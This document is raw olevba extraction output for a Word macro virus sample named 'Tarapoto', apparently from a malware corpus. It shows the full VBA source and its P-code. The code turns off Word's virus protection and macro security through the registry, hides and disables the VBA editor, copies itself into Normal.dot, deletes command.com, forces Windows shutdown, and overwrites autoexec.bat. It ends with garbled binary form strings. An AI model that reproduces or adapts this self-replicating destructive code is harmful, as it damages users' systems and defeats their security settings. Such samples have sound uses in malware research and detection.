olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Tarap
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Tarap - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_close()
On Error Resume Next
VBE.MainWindow.Visible = False
With Options: .VirusProtection = False: .SaveNormalPrompt = False: .ConfirmConversions = False: End With
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable: FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable: WordBasic.DisableAutoMacros 0
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
'The dark
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Seguridad...").Enabled = False
End If
ayah = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: aya = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ID = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(7, 1)
If ID <> "'The dark" Then
    If ayah >= 1 Then
    With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    For q = 1 To ayah
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
    Next q
    End With
    End If
End If
p = VBE.CommandBars.Count: pp = VBE.Windows.Count
For L = 1 To p
VBE.CommandBars.Item(L).Enabled = False
Next L
For L = 1 To pp
VBE.Windows.Item(L).Visible = False
Next L
If ayah < 81 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name: ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\windows\wind.sys": ActiveDocument.VBProject.VBComponents.Item(2).Export "c:\windows\wtv.dll": NormalTemplate.VBProject.VBComponents.Import "c:\windows\wtv.dll"
End If
If aya = 0 Then
    Set host = ActiveDocument.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Import "c:\windows\wtv.dll"
End If
host.CodeModule.AddFromFile ("c:\windows\wind.sys")
With host.CodeModule
    For x = 1 To 4
    .DeleteLines 1
    Next x
End With
Randomize
a = Int((30 * Rnd) + 1): If Day(Now) = a Then MsgBox "The Dark is Ready... Este documento es una basura", 2046, "Tarapoto Virus 2000"
If Day(Now) = 1 And (Month(Now) Mod 2 = 0) Then MsgBox Application.UserName & ": Tu Pc esta bajo mi control; Visita Tarapoto Ciudad de las Palmeras. Virus creado por 'The Dark' tpp e-mail:thedarktpp@mixmail.com ", 0, "TARAPOTO VIRUS/tpp.win": Call tppform.Show
If Day(Now) = 1 And (Month(Now) = 9) Then
MsgBox "Hoy cumple " & Year(Now) - 1979 & " aсos mi creador 'The Dark' y por eso nadie trabaja hoy. ", 4096, "TARAPOTO VIRUS/tpp.win"
Kill ("c:\command.com"): Shell ("c:\windows\rundll32.exe user,exitwindows")
End If
If ayah < 81 Then
    With host.CodeModule:
    .replaceline 1, "Sub document_close()": .replaceline 73, "Sub ViewVBcode()"
    .replaceline 76, "Sub HelpAbout()": .replaceline 79, "Sub ToolsMacro()"
    .replaceline 82, "Sub ToolsCustomizeKeyboard()": .replaceline 85, "Sub FileSaveAs()"
    .replaceline 88, "End Sub"
    End With
End If
    If Day(Now) = 15 Then
        Open "c:\Autoexec.bat" For Input As #1
        Dim w, y: y = 0
        Do While Not EOF(1)
            Line Input #1, w: Debug.Print w
            If w = "rem the dark" Then y = 1
        Loop
        Close #1
        If y = 0 Then
        Name ("c:\Autoexec.bat") As ("c:\autoexe.bat")
        Close: Open "c:\Autoexec.bat" For Output As #1: Print #1, "@ echo off": Print #1, "rem the dark": Print #1, "echo   TaRaPoTo's Soft Copyright 1999 - 2002 ": Print #1, "echo       by: The Dark  ": Print #1, "echo   e-mail: thedarktpp@mixmail.com": Print #1, "echo.  ": Print #1, "pause": Print #1, "Autoexe": Close #1
        End If
    End If
If ayah >= 88 And aya = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ViewVBcode()
Shell ("c:\windows\rundll32.exe user,exitwindows")
End Sub
Sub HelpAbout()
tppform.Show
End Sub
Sub ToolsMacro()
Shell ("c:\windows\rundll32.exe user,exitwindows")
End Sub
Sub ToolsCustomizeKeyboard()
tppform.Show
End Sub
Sub FileSaveAs()
Call document_close '                Tarapoto Virus by the Darktpp
Dialogs(wdDialogFileSaveAs).Show 'vamos por el normal!!!  Tarapoto - Perъ   2000
End Sub
-------------------------------------------------------------------------------
VBA MACRO tppform.frm 
in file: ./Virus.MSWord.Tarap - OLE stream: 'Macros/VBA/tppform'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 














Private Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Type POINTAPI
        x As Long
        y As Long
End Type
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Sub UserForm_Click()
Dim x As Long
Dim y As Long
Dim pT As POINTAPI
    Do While w < 4000
        GetCursorPos pT
        x = Rnd(2)
        If x = 0 Then x = -5 Else x = 5
        y = Rnd(2)
        If y = 0 Then y = -5 Else y = 5
        SetCursorPos pT.x + x, pT.y + y
        Sleep 2
        DoEvents
        w = w + 1
        If w Mod 125 = 0 Then
        Label1.Visible = False
        End If
        If w Mod 250 = 1 Then
        Label1.Visible = True
        End If
    Loop
End Sub
Private Sub CommandButton1_Click()
Unload Me
End Sub
Private Sub Image1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal y As Single)
Image1.Visible = False
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Tarap
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14967 bytes
' Line #0:
' 	FuncDefn (Sub document_close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	EndWith 
' Line #4:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' 	BoS 0x0000 
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #5:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #6:
' 	QuoteRem 0x0000 0x0008 "The dark"
' Line #7:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #8:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Seguridad..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ayah 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St aya 
' Line #11:
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ID 
' Line #12:
' 	Ld ID 
' 	LitStr 0x0009 "'The dark"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	Ld ayah 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #14:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #15:
' 	StartForVariable 
' 	Ld q 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ayah 
' 	For 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #17:
' 	StartForVariable 
' 	Ld q 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	EndWith 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld VBE 
' 	MemLd CommandBars 
' 	MemLd Count 
' 	St p 
' 	BoS 0x0000 
' 	Ld VBE 
' 	MemLd Windows 
' 	MemLd Count 
' 	St pp 
' Line #22:
' 	StartForVariable 
' 	Ld L 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld p 
' 	For 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld L 
' 	Ld VBE 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	StartForVariable 
' 	Ld L 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	StartForVariable 
' 	Ld L 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld pp 
' 	For 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld L 
' 	Ld VBE 
' 	MemLd Windows 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Visible 
' Line #27:
' 	StartForVariable 
' 	Ld L 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	Ld ayah 
' 	LitDI2 0x0051 
' 	Lt 
' 	IfBlock 
' Line #29:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #30:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' 	BoS 0x0000 
' 	LitStr 0x0013 "c:\windows\wind.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0012 "c:\windows\wtv.dll"
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0012 "c:\windows\wtv.dll"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld aya 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #34:
' 	LitStr 0x0012 "c:\windows\wtv.dll"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	LitStr 0x0013 "c:\windows\wind.sys"
' 	Paren 
' 	Ld host 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #39:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	EndWith 
' Line #42:
' 	ArgsCall Read 0x0000 
' Line #43:
' 	LitDI2 0x001E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St a 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld a 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0031 "The Dark is Ready... Este documento es una basura"
' 	LitDI2 0x07FE 
' 	LitStr 0x0013 "Tarapoto Virus 2000"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #44:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0084 ": Tu Pc esta bajo mi control; Visita Tarapoto Ciudad de las Palmeras. Virus creado por 'The Dark' tpp e-mail:thedarktpp@mixmail.com "
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0016 "TARAPOTO VIRUS/tpp.win"
' 	ArgsCall MsgBox 0x0003 
' 	BoS 0x0000 
' 	Ld tppform 
' 	ArgsMemCall (Call) Show 0x0000 
' 	EndIf 
' Line #45:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #46:
' 	LitStr 0x000B "Hoy cumple "
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07BB 
' 	Sub 
' 	Concat 
' 	LitStr 0x0039 " aсos mi creador 'The Dark' y por eso nadie trabaja hoy. "
' 	Concat 
' 	LitDI2 0x1000 
' 	LitStr 0x0016 "TARAPOTO VIRUS/tpp.win"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	LitStr 0x000E "c:\command.com"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0028 "c:\windows\rundll32.exe user,exitwindows"
' 	Paren 
' 	ArgsCall Shell 0x0001 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld ayah 
' 	LitDI2 0x0051 
' 	Lt 
' 	IfBlock 
' Line #50:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' 	BoS 0x0000 
' Line #51:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "Sub document_close()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0049 
' 	LitStr 0x0010 "Sub ViewVBcode()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #52:
' 	LitDI2 0x004C 
' 	LitStr 0x000F "Sub HelpAbout()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x004F 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #53:
' 	LitDI2 0x0052 
' 	LitStr 0x001C "Sub ToolsCustomizeKeyboard()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0055 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #54:
' 	LitDI2 0x0058 
' 	LitStr 0x0007 "End Sub"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #55:
' 	EndWith 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #58:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #59:
' 	Dim 
' 	VarDefn w
' 	VarDefn y
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St y 
' Line #60:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld w 
' 	LineInput 
' 	BoS 0x0000 
' 	Debug 
' 	PrintObj 
' 	Ld w 
' 	PrintItemNL 
' Line #62:
' 	Ld w 
' 	LitStr 0x000C "rem the dark"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St y 
' 	EndIf 
' Line #63:
' 	Loop 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #65:
' 	Ld y 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #66:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	Paren 
' 	LitStr 0x000E "c:\autoexe.bat"
' 	Paren 
' 	Name 
' Line #67:
' 	CloseAll 
' 	BoS 0x0000 
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "@ echo off"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "rem the dark"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo   TaRaPoTo's Soft Copyright 1999 - 2002 "
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "echo       by: The Dark  "
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "echo   e-mail: thedarktpp@mixmail.com"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "echo.  "
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Autoexe"
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Ld ayah 
' 	LitDI2 0x0058 
' 	Ge 
' 	Ld aya 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub ViewVBcode())
' Line #73:
' 	LitStr 0x0028 "c:\windows\rundll32.exe user,exitwindows"
' 	Paren 
' 	ArgsCall Shell 0x0001 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub HelpAbout())
' Line #76:
' 	Ld tppform 
' 	ArgsMemCall Show 0x0000 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub ToolsMacro())
' Line #79:
' 	LitStr 0x0028 "c:\windows\rundll32.exe user,exitwindows"
' 	Paren 
' 	ArgsCall Shell 0x0001 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #82:
' 	Ld tppform 
' 	ArgsMemCall Show 0x0000 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub FileSaveAs())
' Line #85:
' 	ArgsCall (Call) document_close 0x0000 
' 	QuoteRem 0x0014 0x002D "                Tarapoto Virus by the Darktpp"
' Line #86:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	QuoteRem 0x0021 0x002E "vamos por el normal!!!  Tarapoto - Perъ   2000"
' Line #87:
' 	EndSub 
' Macros/VBA/tppform - 4020 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' 	FuncDefn (Private Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long)
' Line #15:
' 	FuncDefn (Private Declare Function GetCursorPos Lib "user32" (lpPoint As ) As Long)
' Line #16:
' 	Type (Private) POINTAPI
' Line #17:
' 	DimImplicit 
' 	VarDefn x (As Long)
' Line #18:
' 	DimImplicit 
' 	VarDefn y (As Long)
' Line #19:
' 	EndType 
' Line #20:
' 	FuncDefn (Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long))
' Line #21:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #22:
' 	Dim 
' 	VarDefn x (As Long)
' Line #23:
' 	Dim 
' 	VarDefn y (As Long)
' Line #24:
' 	Dim 
' 	VarDefn pT (As POINTAPI)
' Line #25:
' 	Ld w 
' 	LitDI2 0x0FA0 
' 	Lt 
' 	DoWhile 
' Line #26:
' 	Ld pT 
' 	ArgsCall GetCursorPos 0x0001 
' Line #27:
' 	LitDI2 0x0002 
' 	ArgsLd Rnd 0x0001 
' 	St x 
' Line #28:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0005 
' 	UMi 
' 	St x 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0005 
' 	St x 
' 	EndIf 
' Line #29:
' 	LitDI2 0x0002 
' 	ArgsLd Rnd 0x0001 
' 	St y 
' Line #30:
' 	Ld y 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0005 
' 	UMi 
' 	St y 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0005 
' 	St y 
' 	EndIf 
' Line #31:
' 	Ld pT 
' 	MemLd x 
' 	Ld x 
' 	Add 
' 	Ld pT 
' 	MemLd y 
' 	Ld y 
' 	Add 
' 	ArgsCall SetCursorPos 0x0002 
' Line #32:
' 	LitDI2 0x0002 
' 	ArgsCall Sleep 0x0001 
' Line #33:
' 	ArgsCall DoEvents 0x0000 
' Line #34:
' 	Ld w 
' 	LitDI2 0x0001 
' 	Add 
' 	St w 
' Line #35:
' 	Ld w 
' 	LitDI2 0x007D 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Label1 
' 	MemSt Visible 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld w 
' 	LitDI2 0x00FA 
' 	Mod 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	Ld Label1 
' 	MemSt Visible 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Loop 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #44:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Private Sub Image1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal x As Single, ByVal y As Single))
' Line #47:
' 	LitVarSpecial (False)
' 	Ld Image1 
' 	MemSt Visible 
' Line #48:
' 	EndSub 
' Line #49:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Si necesitas ayuda escribe a:  thedarktpp@mixmail.com-11�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��$3br�	

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.<Ғ0����`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,I%X��3�Ƣ������d�i���a")
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�s��4q���6ֆ��M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.���$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�ܶ� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C*���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U������H^9bW,��1��pG
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
px���pjr�Ϻ�l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�X�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ca�猊���.��tk�ݶ�����,�3�7/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�h�/��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|��~\dc
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
